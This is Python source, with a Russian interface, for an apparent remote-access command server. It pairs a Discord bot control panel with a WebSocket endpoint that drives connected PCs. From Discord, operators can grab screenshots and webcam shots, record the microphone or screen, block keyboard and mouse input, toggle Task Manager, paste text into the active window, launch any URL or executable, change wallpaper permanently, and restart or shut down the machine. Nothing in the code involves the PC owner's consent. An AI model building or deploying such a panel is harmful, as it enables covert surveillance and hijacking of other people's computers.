from __future__ import annotations

import asyncio
import base64
import io
import json
import os
import time
import uuid
from typing import Any

import discord
from aiohttp import WSMsgType, web
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
CHANNEL_ID = int(os.getenv("CHANNEL_ID", "0"))
WS_HOST = os.getenv("WS_HOST", "0.0.0.0")
WS_PORT = int(os.getenv("PORT", os.getenv("WS_PORT", "8765")))

if not DISCORD_TOKEN or not CHANNEL_ID:
    raise SystemExit("Заполните DISCORD_TOKEN и CHANNEL_ID в файле .env")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

sessions: dict[str, dict[str, Any]] = {}
user_selected_session: dict[int, str] = {}
# user_id -> {kind: fullscreen|wallpaper, session, seconds?, expires}
pending_image: dict[int, dict[str, Any]] = {}

panel_message_id: int | None = None
panel_lock = asyncio.Lock()


def session_options() -> list[discord.SelectOption]:
    options = [
        discord.SelectOption(label=data["name"][:100], value=sid)
        for sid, data in sessions.items()
    ]
    if not options:
        options = [
            discord.SelectOption(
                label="Нет онлайн-сессий",
                value="__none__",
                description="Запустите client.py",
            )
        ]
    return options[:25]


def get_user_session(user_id: int) -> dict[str, Any] | None:
    session_id = user_selected_session.get(user_id)
    if not session_id or session_id not in sessions:
        return None
    return sessions[session_id]


def session_alive(session: dict[str, Any]) -> bool:
    return session in sessions.values()


def format_uptime(seconds: float) -> str:
    total = max(0, int(seconds))
    if total < 60:
        return f"{total} сек"
    if total < 3600:
        return f"{total // 60} мин"
    hours = total // 3600
    minutes = (total % 3600) // 60
    if hours < 24:
        return f"{hours} ч {minutes} мин" if minutes else f"{hours} ч"
    days = hours // 24
    hours = hours % 24
    return f"{days} д {hours} ч" if hours else f"{days} д"


async def request_session(
    session: dict[str, Any],
    payload: dict[str, Any],
    *,
    timeout: float,
) -> dict[str, Any] | None:
    request_id = str(uuid.uuid4())
    payload = {**payload, "id": request_id}
    loop = asyncio.get_running_loop()
    future: asyncio.Future[dict[str, Any]] = loop.create_future()
    session["pending"][request_id] = future

    try:
        await session["ws"].send_json(payload)
    except Exception:
        session["pending"].pop(request_id, None)
        return None

    try:
        return await asyncio.wait_for(future, timeout=timeout)
    except asyncio.TimeoutError:
        session["pending"].pop(request_id, None)
        return {"ok": False, "error": "timeout"}


async def require_session(interaction: discord.Interaction) -> dict[str, Any] | None:
    session = get_user_session(interaction.user.id)
    if session is None:
        await interaction.response.send_message(
            "Сначала выберите сессию в списке.",
            ephemeral=True,
        )
        return None
    return session


async def send_command_result(
    interaction: discord.Interaction,
    session: dict[str, Any],
    result: dict[str, Any] | None,
    *,
    ok_text: str,
    fail_prefix: str,
) -> None:
    if result is None:
        await interaction.followup.send(
            f"{fail_prefix}: сессия отключилась.",
            ephemeral=True,
        )
        return

    if result.get("file_bytes") is not None:
        raw = result["file_bytes"]
        filename = result.get("filename") or "file.bin"
        if len(raw) > 24 * 1024 * 1024:
            await interaction.followup.send(
                f"{fail_prefix}: файл слишком большой для Discord.",
                ephemeral=True,
            )
            return
        file = discord.File(io.BytesIO(raw), filename=filename)
        await interaction.followup.send(
            content=ok_text if result.get("ok") else None,
            file=file,
            ephemeral=True,
        )
        return

    if result.get("image_b64"):
        raw = base64.b64decode(result["image_b64"])
        ext = result.get("image_ext") or "jpg"
        file = discord.File(io.BytesIO(raw), filename=f"capture.{ext}")
        await interaction.followup.send(
            content=ok_text if result.get("ok") else None,
            file=file,
            ephemeral=True,
        )
        return

    if result.get("ok"):
        text = result.get("text")
        if text:
            chunks = [text[i : i + 1900] for i in range(0, len(text), 1900)]
            await interaction.followup.send(
                f"{ok_text}\n```\n{chunks[0]}\n```",
                ephemeral=True,
            )
            for chunk in chunks[1:]:
                await interaction.followup.send(f"```\n{chunk}\n```", ephemeral=True)
        else:
            await interaction.followup.send(ok_text, ephemeral=True)
        return

    err = result.get("error") or "unknown"
    await interaction.followup.send(f"{fail_prefix}: {err}", ephemeral=True)


def resolve_pending(request_id: str, result: dict[str, Any]) -> bool:
    for session in sessions.values():
        pending = session.get("pending") or {}
        future = pending.pop(request_id, None)
        if future is not None:
            if not future.done():
                future.set_result(result)
            return True
    return False


class SessionSelect(discord.ui.Select):
    def __init__(self) -> None:
        super().__init__(
            placeholder="Выберите ПК (сессию)",
            custom_id="session_select",
            options=session_options(),
            min_values=1,
            max_values=1,
            row=0,
        )

    async def callback(self, interaction: discord.Interaction) -> None:
        value = self.values[0]
        if value == "__none__" or value not in sessions:
            await interaction.response.send_message(
                "Сессия недоступна. Запустите client.py и обновите список.",
                ephemeral=True,
            )
            return

        user_selected_session[interaction.user.id] = value
        name = sessions[value]["name"]
        await interaction.response.send_message(
            f"Выбрана сессия: **{name}**",
            ephemeral=True,
        )


class SimpleCommandButton(discord.ui.Button):
    def __init__(
        self,
        *,
        label: str,
        custom_id: str,
        command: str,
        style: discord.ButtonStyle = discord.ButtonStyle.secondary,
        timeout: float = 15.0,
        ok_text: str | None = None,
        payload_extra: dict[str, Any] | None = None,
        row: int | None = None,
    ) -> None:
        super().__init__(label=label, style=style, custom_id=custom_id, row=row)
        self.command = command
        self.timeout = timeout
        self.ok_text = ok_text or f"{label}: ок"
        self.payload_extra = payload_extra or {}

    async def callback(self, interaction: discord.Interaction) -> None:
        session = await require_session(interaction)
        if session is None:
            return

        await interaction.response.defer(ephemeral=True)
        result = await request_session(
            session,
            {"type": self.command, **self.payload_extra},
            timeout=self.timeout,
        )
        await send_command_result(
            interaction,
            session,
            result,
            ok_text=f"{self.ok_text} (**{session['name']}**)",
            fail_prefix=self.label,
        )


class StatusButton(discord.ui.Button):
    def __init__(self, *, row: int | None = None) -> None:
        super().__init__(
            label="Статус",
            style=discord.ButtonStyle.secondary,
            custom_id="status_button",
            row=row,
        )

    async def callback(self, interaction: discord.Interaction) -> None:
        session = await require_session(interaction)
        if session is None:
            return

        if not session_alive(session):
            await interaction.response.send_message(
                "Сессия оффлайн или уже отключилась.",
                ephemeral=True,
            )
            return

        connected_at = session.get("connected_at", time.time())
        uptime = format_uptime(time.time() - connected_at)

        await interaction.response.send_message(
            f"**{session['name']}**\n"
            f"Статус: **онлайн**\n"
            f"Uptime client: **{uptime}**",
            ephemeral=True,
        )


class NotifyModal(discord.ui.Modal, title="Уведомление"):
    text = discord.ui.TextInput(
        label="Текст уведомления",
        style=discord.TextStyle.paragraph,
        placeholder="Сообщение на экране ПК",
        max_length=500,
        required=True,
    )

    def __init__(self, session: dict[str, Any]) -> None:
        super().__init__()
        self.session = session

    async def on_submit(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        text = str(self.text.value).strip()
        if not text:
            await interaction.followup.send("Пустой текст.", ephemeral=True)
            return
        if not session_alive(self.session):
            await interaction.followup.send("Сессия уже оффлайн.", ephemeral=True)
            return

        result = await request_session(
            self.session,
            {"type": "notify", "text": text},
            timeout=60.0,
        )
        await send_command_result(
            interaction,
            self.session,
            result,
            ok_text=f"Уведомление показано на **{self.session['name']}**",
            fail_prefix="Уведомление",
        )


class PasteModal(discord.ui.Modal, title="Вставка"):
    text = discord.ui.TextInput(
        label="Текст для вставки",
        style=discord.TextStyle.paragraph,
        placeholder="Вставится в активное окно на ПК",
        max_length=2000,
        required=True,
    )

    def __init__(self, session: dict[str, Any]) -> None:
        super().__init__()
        self.session = session

    async def on_submit(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        text = str(self.text.value)
        if not text:
            await interaction.followup.send("Пустой текст.", ephemeral=True)
            return
        if not session_alive(self.session):
            await interaction.followup.send("Сессия уже оффлайн.", ephemeral=True)
            return

        result = await request_session(
            self.session,
            {"type": "paste", "text": text},
            timeout=10.0,
        )
        await send_command_result(
            interaction,
            self.session,
            result,
            ok_text=f"Текст вставлен на **{self.session['name']}**",
            fail_prefix="Вставка",
        )


class OpenModal(discord.ui.Modal, title="Открыть"):
    target = discord.ui.TextInput(
        label="URL или путь к .exe / файлу",
        style=discord.TextStyle.short,
        placeholder="https://... или C:\\Path\\app.exe",
        max_length=500,
        required=True,
    )

    def __init__(self, session: dict[str, Any]) -> None:
        super().__init__()
        self.session = session

    async def on_submit(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        target = str(self.target.value).strip()
        if not session_alive(self.session):
            await interaction.followup.send("Сессия уже оффлайн.", ephemeral=True)
            return
        result = await request_session(
            self.session,
            {"type": "open", "target": target},
            timeout=15.0,
        )
        await send_command_result(
            interaction,
            self.session,
            result,
            ok_text=f"Открыто на **{self.session['name']}**: `{target}`",
            fail_prefix="Открыть",
        )


class CloseModal(discord.ui.Modal, title="Закрыть"):
    process = discord.ui.TextInput(
        label="Имя процесса",
        style=discord.TextStyle.short,
        placeholder="notepad.exe",
        max_length=120,
        required=True,
    )

    def __init__(self, session: dict[str, Any]) -> None:
        super().__init__()
        self.session = session

    async def on_submit(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        process = str(self.process.value).strip()
        if not process.lower().endswith(".exe"):
            process += ".exe"
        if not session_alive(self.session):
            await interaction.followup.send("Сессия уже оффлайн.", ephemeral=True)
            return
        result = await request_session(
            self.session,
            {"type": "close", "process": process},
            timeout=15.0,
        )
        await send_command_result(
            interaction,
            self.session,
            result,
            ok_text=f"Закрыто на **{self.session['name']}**: `{process}`",
            fail_prefix="Закрыть",
        )


class FullscreenModal(discord.ui.Modal, title="На экран"):
    seconds = discord.ui.TextInput(
        label="Сколько секунд показать",
        style=discord.TextStyle.short,
        placeholder="10",
        max_length=6,
        required=True,
    )

    def __init__(self, session: dict[str, Any]) -> None:
        super().__init__()
        self.session = session

    async def on_submit(self, interaction: discord.Interaction) -> None:
        try:
            secs = int(str(self.seconds.value).strip())
            if secs < 1 or secs > 86400:
                raise ValueError
        except ValueError:
            await interaction.response.send_message(
                "Укажите число секунд от 1 до 86400.",
                ephemeral=True,
            )
            return

        pending_image[interaction.user.id] = {
            "kind": "fullscreen",
            "session": self.session,
            "seconds": secs,
            "expires": time.time() + 60,
        }
        await interaction.response.send_message(
            f"В течение **60 сек** отправьте в канал **картинку** — "
            f"на **{self.session['name']}** она откроется на весь экран на {secs} сек.",
            ephemeral=True,
        )


class ConfirmPowerModal(discord.ui.Modal):
    confirm = discord.ui.TextInput(
        label="Для подтверждения напишите ДА",
        style=discord.TextStyle.short,
        max_length=10,
        required=True,
    )

    def __init__(self, session: dict[str, Any], command: str, title: str) -> None:
        super().__init__(title=title)
        self.session = session
        self.command = command

    async def on_submit(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        if str(self.confirm.value).strip().upper() != "ДА":
            await interaction.followup.send("Отменено.", ephemeral=True)
            return
        if not session_alive(self.session):
            await interaction.followup.send("Сессия уже оффлайн.", ephemeral=True)
            return

        labels = {"restart": "перезагрузка", "shutdown": "выключение"}
        result = await request_session(
            self.session,
            {"type": self.command},
            timeout=10.0,
        )
        await send_command_result(
            interaction,
            self.session,
            result,
            ok_text=f"Команда «{labels.get(self.command, self.command)}» "
            f"отправлена на **{self.session['name']}**",
            fail_prefix=labels.get(self.command, self.command),
        )


class RecordSecondsModal(discord.ui.Modal):
    seconds = discord.ui.TextInput(
        label="Длительность (секунды)",
        style=discord.TextStyle.short,
        placeholder="10",
        max_length=3,
        required=True,
    )

    def __init__(self, session: dict[str, Any], kind: str) -> None:
        title = "Клип экрана" if kind == "screen_clip" else "Микрофон"
        super().__init__(title=title)
        self.session = session
        self.kind = kind
        if kind == "screen_clip":
            self.seconds.placeholder = "5–15"
        else:
            self.seconds.placeholder = "1–30"

    async def on_submit(self, interaction: discord.Interaction) -> None:
        try:
            secs = int(str(self.seconds.value).strip())
        except ValueError:
            await interaction.response.send_message(
                "Укажите число секунд.",
                ephemeral=True,
            )
            return

        if self.kind == "screen_clip":
            if secs < 5 or secs > 15:
                await interaction.response.send_message(
                    "Для клипа укажите от 5 до 15 секунд.",
                    ephemeral=True,
                )
                return
            label = "Клип"
        else:
            if secs < 1 or secs > 30:
                await interaction.response.send_message(
                    "Для микрофона укажите от 1 до 30 секунд.",
                    ephemeral=True,
                )
                return
            label = "Микрофон"

        if not session_alive(self.session):
            await interaction.response.send_message(
                "Сессия уже оффлайн.",
                ephemeral=True,
            )
            return

        await interaction.response.defer(ephemeral=True)
        await interaction.followup.send(
            f"Идёт запись ({secs} сек) на **{self.session['name']}**…",
            ephemeral=True,
        )
        result = await request_session(
            self.session,
            {"type": self.kind, "seconds": secs},
            timeout=float(secs + 45),
        )
        await send_command_result(
            interaction,
            self.session,
            result,
            ok_text=f"{label} с **{self.session['name']}** ({secs} сек)",
            fail_prefix=label,
        )


class RecordSelect(discord.ui.Select):
    def __init__(self) -> None:
        super().__init__(
            placeholder="Запись: клип экрана / микрофон",
            custom_id="record_select",
            options=[
                discord.SelectOption(
                    label="Клип экрана",
                    value="screen_clip",
                    description="Видео 5–15 секунд",
                ),
                discord.SelectOption(
                    label="Микрофон",
                    value="mic",
                    description="Аудио 1–30 секунд",
                ),
            ],
            min_values=1,
            max_values=1,
            row=1,
        )

    async def callback(self, interaction: discord.Interaction) -> None:
        session = await require_session(interaction)
        if session is None:
            return
        kind = self.values[0]
        await interaction.response.send_modal(RecordSecondsModal(session, kind))


class ModalButton(discord.ui.Button):
    def __init__(
        self,
        *,
        label: str,
        custom_id: str,
        modal_factory,
        style: discord.ButtonStyle = discord.ButtonStyle.secondary,
        row: int | None = None,
    ) -> None:
        super().__init__(label=label, style=style, custom_id=custom_id, row=row)
        self.modal_factory = modal_factory

    async def callback(self, interaction: discord.Interaction) -> None:
        session = await require_session(interaction)
        if session is None:
            return
        await interaction.response.send_modal(self.modal_factory(session))


class WallpaperButton(discord.ui.Button):
    def __init__(self, *, row: int | None = None) -> None:
        super().__init__(
            label="Обои",
            style=discord.ButtonStyle.secondary,
            custom_id="wallpaper_button",
            row=row,
        )

    async def callback(self, interaction: discord.Interaction) -> None:
        session = await require_session(interaction)
        if session is None:
            return

        pending_image[interaction.user.id] = {
            "kind": "wallpaper",
            "session": session,
            "expires": time.time() + 60,
        }
        await interaction.response.send_message(
            f"В течение **60 сек** отправьте в канал **картинку** — "
            f"она станет обоями навсегда на **{session['name']}**.",
            ephemeral=True,
        )


async def clear_chat(interaction: discord.Interaction) -> None:
    if interaction.channel_id != CHANNEL_ID:
        await interaction.response.send_message(
            "Очистка только в канале с панелью.",
            ephemeral=True,
        )
        return

    await interaction.response.defer(ephemeral=True)
    channel = interaction.channel
    deleted = 0
    skipped = 0

    async for message in channel.history(limit=300):
        if message.author.id != bot.user.id:
            continue
        if panel_message_id and message.id == panel_message_id:
            skipped += 1
            continue
        if message.pinned:
            skipped += 1
            continue
        if message.components:
            skipped += 1
            continue
        try:
            await message.delete()
            deleted += 1
            await asyncio.sleep(0.35)
        except discord.HTTPException:
            skipped += 1

    await interaction.followup.send(
        f"Удалено сообщений бота: **{deleted}**. Панель и закреплённые — сохранены.",
        ephemeral=True,
    )


class ExtraSelect(discord.ui.Select):
    def __init__(self) -> None:
        super().__init__(
            placeholder="Ещё: закрыть, питание, очистка…",
            custom_id="extra_select",
            options=[
                discord.SelectOption(label="Закрыть", value="close"),
                discord.SelectOption(label="Приложения", value="apps"),
                discord.SelectOption(label="Блок ввода", value="block"),
                discord.SelectOption(label="Диспетчер", value="taskmgr"),
                discord.SelectOption(label="Перезагрузка ПК", value="restart"),
                discord.SelectOption(label="Выключить ПК", value="shutdown"),
                discord.SelectOption(label="Перезапуск client", value="restart_client"),
                discord.SelectOption(label="Очистить чат", value="clear_chat"),
            ],
            min_values=1,
            max_values=1,
            row=4,
        )

    async def callback(self, interaction: discord.Interaction) -> None:
        session = await require_session(interaction)
        if session is None:
            return

        action = self.values[0]
        if action == "close":
            await interaction.response.send_modal(CloseModal(session))
            return
        if action == "restart":
            await interaction.response.send_modal(
                ConfirmPowerModal(session, "restart", "Перезагрузка ПК")
            )
            return
        if action == "shutdown":
            await interaction.response.send_modal(
                ConfirmPowerModal(session, "shutdown", "Выключение ПК")
            )
            return
        if action == "clear_chat":
            await clear_chat(interaction)
            return

        commands = {
            "apps": ("list_apps", 15.0, "Активные окна"),
            "block": ("toggle_input_block", 15.0, "Блокировка ввода"),
            "taskmgr": ("toggle_taskmgr", 15.0, "Диспетчер задач"),
            "restart_client": ("restart_client", 10.0, "Client перезапущен"),
        }
        command, timeout, ok_text = commands[action]
        await interaction.response.defer(ephemeral=True)
        result = await request_session(
            session,
            {"type": command},
            timeout=timeout,
        )
        await send_command_result(
            interaction,
            session,
            result,
            ok_text=f"{ok_text} (**{session['name']}**)",
            fail_prefix=action,
        )


class ControlPanel(discord.ui.View):
    def __init__(self) -> None:
        super().__init__(timeout=None)
        self.add_item(SessionSelect())
        self.add_item(RecordSelect())

        self.add_item(
            SimpleCommandButton(
                label="Пинг",
                custom_id="ping_button",
                command="ping",
                style=discord.ButtonStyle.primary,
                timeout=5.0,
                ok_text="pong",
                row=2,
            )
        )
        self.add_item(StatusButton(row=2))
        self.add_item(
            ModalButton(
                label="Уведомление",
                custom_id="notify_button",
                modal_factory=NotifyModal,
                row=2,
            )
        )
        self.add_item(
            ModalButton(
                label="Вставка",
                custom_id="paste_button",
                modal_factory=PasteModal,
                row=2,
            )
        )
        self.add_item(
            SimpleCommandButton(
                label="Скрин",
                custom_id="screen_button",
                command="screenshot",
                timeout=20.0,
                ok_text="Скриншот",
                row=2,
            )
        )
        self.add_item(
            SimpleCommandButton(
                label="Вебка",
                custom_id="webcam_button",
                command="webcam",
                timeout=25.0,
                ok_text="Камера",
                row=3,
            )
        )
        self.add_item(
            SimpleCommandButton(
                label="Рабочий стол",
                custom_id="desktop_button",
                command="show_desktop",
                ok_text="Свёрнуто на рабочий стол (Win+D)",
                row=3,
            )
        )
        self.add_item(
            ModalButton(
                label="На экран",
                custom_id="fullscreen_button",
                modal_factory=FullscreenModal,
                row=3,
            )
        )
        self.add_item(WallpaperButton(row=3))
        self.add_item(
            ModalButton(
                label="Открыть",
                custom_id="open_button",
                modal_factory=OpenModal,
                row=3,
            )
        )
        self.add_item(ExtraSelect())


def panel_embed() -> discord.Embed:
    if sessions:
        lines = []
        now = time.time()
        for data in sessions.values():
            uptime = format_uptime(now - data.get("connected_at", now))
            lines.append(f"• `{data['name']}` — {uptime}")
        body = "\n".join(lines)
    else:
        body = "_Нет онлайн-сессий. Запустите `client.py`._"

    return discord.Embed(
        title="Управление сессиями",
        description=(
            "Выберите ПК, затем команду. Ответы **только вам**.\n"
            "**Статус** — uptime выбранной сессии.\n"
            "**Запись** — клип экрана (5–15 сек) или микрофон (1–30 сек).\n"
            "**На экран** — картинка на весь экран на N секунд (потом пришлите фото).\n"
            "**Обои** — поставить картинку обоями навсегда (потом пришлите фото).\n"
            "**Ещё** — закрыть окно, приложения, блок ввода, питание, очистка чата.\n"
            "**Перезагрузка / Выключить** — подтверждение словом `ДА`.\n\n"
            f"**Онлайн:**\n{body}"
        ),
        color=discord.Color.green(),
    )


async def refresh_panel() -> None:
    global panel_message_id
    async with panel_lock:
        channel = bot.get_channel(CHANNEL_ID)
        if channel is None:
            try:
                channel = await bot.fetch_channel(CHANNEL_ID)
            except Exception as exc:
                print(f"Не удалось получить канал: {exc}")
                return

        try:
            view = ControlPanel()
        except Exception as exc:
            print(f"Не удалось собрать панель: {exc}")
            return

        embed = panel_embed()

        if panel_message_id is None:
            msg = await channel.send(embed=embed, view=view)
            panel_message_id = msg.id
            return

        try:
            msg = await channel.fetch_message(panel_message_id)
            await msg.edit(embed=embed, view=view)
        except discord.NotFound:
            msg = await channel.send(embed=embed, view=view)
            panel_message_id = msg.id
        except Exception as exc:
            print(f"Не удалось обновить панель: {exc}")


def schedule_refresh_panel() -> None:
    asyncio.create_task(refresh_panel())


@bot.event
async def on_message(message: discord.Message) -> None:
    if message.author.bot:
        return
    if message.channel.id != CHANNEL_ID:
        return

    pending = pending_image.get(message.author.id)
    if not pending:
        return
    if time.time() > pending["expires"]:
        pending_image.pop(message.author.id, None)
        return

    image = next(
        (
            a
            for a in message.attachments
            if (a.content_type or "").startswith("image/")
            or a.filename.lower().endswith((".png", ".jpg", ".jpeg", ".webp", ".bmp"))
        ),
        None,
    )
    if image is None:
        return

    pending_image.pop(message.author.id, None)
    session = pending["session"]
    kind = pending["kind"]

    if not session_alive(session):
        await message.reply("Сессия оффлайн.", mention_author=False)
        return

    raw = await image.read()
    if len(raw) > 8 * 1024 * 1024:
        await message.reply("Файл слишком большой (макс 8 МБ).", mention_author=False)
        return

    ext = (image.filename.rsplit(".", 1)[-1] if "." in image.filename else "jpg").lower()
    b64 = base64.b64encode(raw).decode("ascii")

    if kind == "fullscreen":
        seconds = int(pending["seconds"])
        result = await request_session(
            session,
            {
                "type": "fullscreen",
                "image_b64": b64,
                "image_ext": ext,
                "seconds": seconds,
            },
            timeout=30.0,
        )
        if result and result.get("ok"):
            await message.reply(
                f"Картинка на весь экран на **{session['name']}** ({seconds} сек).",
                mention_author=False,
            )
        else:
            err = (result or {}).get("error") or "unknown"
            await message.reply(f"Ошибка «На экран»: {err}", mention_author=False)
        return

    result = await request_session(
        session,
        {
            "type": "wallpaper",
            "image_b64": b64,
            "image_ext": ext,
        },
        timeout=30.0,
    )
    if result and result.get("ok"):
        await message.reply(
            f"Обои навсегда установлены на **{session['name']}**.",
            mention_author=False,
        )
    else:
        err = (result or {}).get("error") or "unknown"
        await message.reply(f"Ошибка обоев: {err}", mention_author=False)


async def ws_handler(request: web.Request) -> web.WebSocketResponse:
    ws = web.WebSocketResponse(heartbeat=30, max_msg_size=16 * 1024 * 1024)
    await ws.prepare(request)

    session_id: str | None = None
    print("WS: новое подключение")

    try:
        async for msg in ws:
            if msg.type != WSMsgType.TEXT:
                if msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
                    break
                continue

            try:
                data = json.loads(msg.data)
            except json.JSONDecodeError:
                await ws.send_json({"type": "error", "message": "invalid json"})
                continue

            msg_type = data.get("type")

            if msg_type == "register":
                name = str(data.get("name") or "unknown")[:100]
                if session_id and session_id in sessions:
                    sessions.pop(session_id, None)

                session_id = str(uuid.uuid4())
                sessions[session_id] = {
                    "name": name,
                    "ws": ws,
                    "pending": {},
                    "connected_at": time.time(),
                }
                print(f"Сессия онлайн: {name} ({session_id})")
                await ws.send_json({"type": "registered", "id": session_id, "name": name})
                schedule_refresh_panel()
                continue

            if msg_type == "result" and session_id and session_id in sessions:
                request_id = data.get("id")
                pending = sessions[session_id]["pending"]
                future = pending.pop(request_id, None) if request_id else None
                if future and not future.done():
                    future.set_result(data)
                continue

    finally:
        if session_id and session_id in sessions:
            name = sessions[session_id]["name"]
            for future in sessions[session_id]["pending"].values():
                if not future.done():
                    future.set_result({"ok": False, "error": "disconnected"})
            sessions.pop(session_id, None)
            for uid, sid in list(user_selected_session.items()):
                if sid == session_id:
                    user_selected_session.pop(uid, None)
            print(f"Сессия оффлайн: {name} ({session_id})")
            if not bot.is_closed():
                schedule_refresh_panel()

    return ws


async def result_file_handler(request: web.Request) -> web.Response:
    request_id = request.match_info["rid"]
    ok_header = request.headers.get("X-Ok", "1")
    if ok_header == "0":
        error = request.headers.get("X-Error", "upload failed")
        resolve_pending(request_id, {"ok": False, "error": error})
        return web.Response(text="ok")

    body = await request.read()
    filename = request.headers.get("X-Filename", "file.bin")
    if not resolve_pending(
        request_id,
        {
            "ok": True,
            "file_bytes": body,
            "filename": filename,
        },
    ):
        return web.Response(status=404, text="unknown request id")
    return web.Response(text="ok")


async def start_ws_server() -> web.AppRunner:
    app = web.Application(client_max_size=32 * 1024 * 1024)
    app.router.add_get("/ws", ws_handler)
    app.router.add_post("/result/{rid}", result_file_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, WS_HOST, WS_PORT)
    await site.start()
    print(f"WebSocket: ws://{WS_HOST}:{WS_PORT}/ws")
    return runner


@bot.event
async def on_ready() -> None:
    bot.add_view(ControlPanel())
    await refresh_panel()
    print(f"Бот запущен: {bot.user} | канал {CHANNEL_ID}")


async def main() -> None:
    runner = await start_ws_server()
    try:
        async with bot:
            await bot.start(DISCORD_TOKEN)
    finally:
        await runner.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
